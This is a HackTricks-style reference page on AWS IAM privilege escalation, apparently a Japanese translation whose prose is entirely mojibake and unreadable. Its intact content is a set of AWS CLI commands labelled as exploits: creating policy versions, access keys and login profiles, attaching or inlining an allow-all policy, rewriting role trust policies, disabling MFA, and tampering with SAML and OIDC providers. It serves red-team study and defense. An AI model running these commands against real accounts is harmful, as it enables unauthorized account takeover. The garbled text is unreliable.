# AWS - IAM Privesc

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## IAM

IAMã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

æ–°ã—ã„IAMãƒãƒªã‚·ãƒ¼ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ä½œæˆã™ã‚‹èƒ½åŠ›ã‚’ä»˜ä¸ã—ã€`--set-as-default`ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§`iam:SetDefaultPolicyVersion`æ¨©é™ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚«ã‚¹ã‚¿ãƒ æ¨©é™ã‚’å®šç¾©ã§ãã¾ã™ã€‚

**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚³ãƒãƒ³ãƒ‰ï¼š**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**å½±éŸ¿:** ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã—ã¦ä»»æ„ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€ç›´æ¥çš„ã«ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

### **`iam:SetDefaultPolicyVersion`**

IAMãƒãƒªã‚·ãƒ¼ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’åˆ¥ã®æ—¢å­˜ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«å¤‰æ›´ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚ˆã‚Šå¤šãã®æ¨©é™ãŒã‚ã‚‹å ´åˆã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**Bashã‚³ãƒãƒ³ãƒ‰:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**å½±éŸ¿:** ã‚ˆã‚Šå¤šãã®æ¨©é™ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹é–“æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:CreateAccessKey`**

ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼IDã¨ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€æ¨©é™æ˜‡æ ¼ã®å¯èƒ½æ€§ã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚

**æ‚ªç”¨:**
```bash
aws iam create-access-key --user-name <target_user>
```
**å½±éŸ¿:** ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ‹¡å¼µæ¨©é™ã‚’å¼•ãå—ã‘ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

AWSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ãƒ­ã‚°ã‚¤ãƒ³ã®ãŸã‚ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰è¨­å®šã‚’å«ã‚€ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã¾ãŸã¯æ›´æ–°ã‚’è¨±å¯ã—ã€ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã«ã¤ãªãŒã‚‹ã€‚

**ä½œæˆã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**æ›´æ–°ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**å½±éŸ¿:** "ä»»æ„"ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:UpdateAccessKey`**

ç„¡åŠ¹ãªã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€æ”»æ’ƒè€…ãŒç„¡åŠ¹ãªã‚­ãƒ¼ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ç„¡è¨±å¯ã®ã‚¢ã‚¯ã‚»ã‚¹ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**æ‚ªç”¨:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**å½±éŸ¿:** ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’å†æ´»æ€§åŒ–ã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

ç‰¹å®šã®AWSã‚µãƒ¼ãƒ“ã‚¹ï¼ˆä¾‹ï¼šCodeCommitã€Amazon Keyspacesï¼‰ã®ãŸã‚ã®è³‡æ ¼æƒ…å ±ã‚’ç”Ÿæˆã¾ãŸã¯ãƒªã‚»ãƒƒãƒˆã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€é–¢é€£ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ¨©é™ã‚’ç¶™æ‰¿ã—ã¾ã™ã€‚

**ä½œæˆã®ãŸã‚ã®æ‚ªç”¨:**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**ãƒªã‚»ãƒƒãƒˆã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**å½±éŸ¿:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚µãƒ¼ãƒ“ã‚¹æ¨©é™å†…ã§ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒãƒªã‚·ãƒ¼ã‚’ã‚¢ã‚¿ãƒƒãƒã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€ã‚¢ã‚¿ãƒƒãƒã•ã‚ŒãŸãƒãƒªã‚·ãƒ¼ã®æ¨©é™ã‚’ç¶™æ‰¿ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦æ¨©é™ã‚’ç›´æ¥æ˜‡æ ¼ã•ã›ã¾ã™ã€‚

**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**ã‚°ãƒ«ãƒ¼ãƒ—ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**å½±éŸ¿:** ãƒãƒªã‚·ãƒ¼ãŒä»˜ä¸ã™ã‚‹ã™ã¹ã¦ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

ãƒ­ãƒ¼ãƒ«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã¾ãŸã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒãƒªã‚·ãƒ¼ã‚’æ·»ä»˜ã¾ãŸã¯è¨­å®šã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€è¿½åŠ ã®æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

**ãƒ­ãƒ¼ãƒ«ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**ã‚¤ãƒ³ãƒ©ã‚¤ãƒ³ãƒãƒªã‚·ãƒ¼ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
ã‚ãªãŸã¯æ¬¡ã®ã‚ˆã†ãªãƒãƒªã‚·ãƒ¼ã‚’ä½¿ç”¨ã§ãã¾ã™:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**å½±éŸ¿:** ãƒãƒªã‚·ãƒ¼ã‚’é€šã˜ã¦æ¨©é™ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:AddUserToGroup`**

IAMã‚°ãƒ«ãƒ¼ãƒ—ã«è‡ªåˆ†è‡ªèº«ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€ã‚°ãƒ«ãƒ¼ãƒ—ã®æ¨©é™ã‚’ç¶™æ‰¿ã™ã‚‹ã“ã¨ã§æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã€‚

**æ‚ªç”¨:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**å½±éŸ¿:** ã‚°ãƒ«ãƒ¼ãƒ—ã®æ¨©é™ãƒ¬ãƒ™ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:UpdateAssumeRolePolicy`**

ãƒ­ãƒ¼ãƒ«ã®ã‚¢ã‚µãƒ ãƒ­ãƒ¼ãƒ«ãƒãƒªã‚·ãƒ¼æ–‡æ›¸ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€ãƒ­ãƒ¼ãƒ«ã¨ãã®é–¢é€£ã™ã‚‹æ¨©é™ã®å¼•ãå—ã‘ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

**æ‚ªç”¨:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
ãƒãƒªã‚·ãƒ¼ãŒä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ­ãƒ¼ãƒ«ã‚’å¼•ãå—ã‘ã‚‹æ¨©é™ãŒä¸ãˆã‚‰ã‚Œã¾ã™ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**å½±éŸ¿:** ä»»æ„ã®ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’å¼•ãå—ã‘ã‚‹ã“ã¨ã«ã‚ˆã‚‹ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

CodeCommitã¸ã®èªè¨¼ã®ãŸã‚ã«SSHå…¬é–‹éµã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€MFAãƒ‡ãƒã‚¤ã‚¹ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€æ½œåœ¨çš„ãªé–“æ¥çš„æ¨©é™æ˜‡æ ¼ã«ã¤ãªãŒã‚‹ã€‚

**SSHã‚­ãƒ¼ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**MFAç„¡åŠ¹åŒ–ã®ãŸã‚ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**å½±éŸ¿:** CodeCommitã‚¢ã‚¯ã‚»ã‚¹ã‚’æœ‰åŠ¹ã«ã™ã‚‹ã‹ã€MFAä¿è­·ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹é–“æ¥çš„ãªç‰¹æ¨©æ˜‡æ ¼ã€‚

### **`iam:ResyncMFADevice`**

MFAãƒ‡ãƒã‚¤ã‚¹ã®å†åŒæœŸã‚’è¨±å¯ã—ã€MFAä¿è­·ã‚’æ“ä½œã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦é–“æ¥çš„ãªç‰¹æ¨©æ˜‡æ ¼ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**Bashã‚³ãƒãƒ³ãƒ‰:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**å½±éŸ¿:** MFAãƒ‡ãƒã‚¤ã‚¹ã‚’è¿½åŠ ã¾ãŸã¯æ“ä½œã™ã‚‹ã“ã¨ã«ã‚ˆã‚‹é–“æ¥çš„ãªç‰¹æ¨©æ˜‡æ ¼ã€‚

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤ã“ã¨ã§ã€**SAMLæ¥ç¶šã®XMLãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€**SAMLãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’æ‚ªç”¨ã—ã¦ã€**ãã‚Œã‚’ä¿¡é ¼ã—ã¦ã„ã‚‹ä»»æ„ã®**ãƒ­ãƒ¼ãƒ«ã§**ãƒ­ã‚°ã‚¤ãƒ³**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚’è¡Œã†ã¨ã€**æ­£å½“ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ­ã‚°ã‚¤ãƒ³ã§ããªããªã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ã‹ã—ã€XMLã‚’å–å¾—ã§ãã‚‹ã®ã§ã€è‡ªåˆ†ã®ã‚‚ã®ã‚’å…¥ã‚Œã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã€ä»¥å‰ã®è¨­å®šã‚’æˆ»ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: æŒ‡å®šã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã—ã€SAMLãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’ç”Ÿæˆã§ãã‚‹ãƒ„ãƒ¼ãƒ«
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

ï¼ˆã“ã‚Œã«ã¤ã„ã¦ã¯ä¸æ˜ï¼‰æ”»æ’ƒè€…ãŒã“ã‚Œã‚‰ã®**æ¨©é™**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã‚’ä¿¡é ¼ã™ã‚‹ã™ã¹ã¦ã®ãƒ­ãƒ¼ãƒ«ã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ãŸã‚ã«æ–°ã—ã„**ã‚µãƒ ãƒ—ãƒªãƒ³ãƒˆ**ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã€‚ 

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
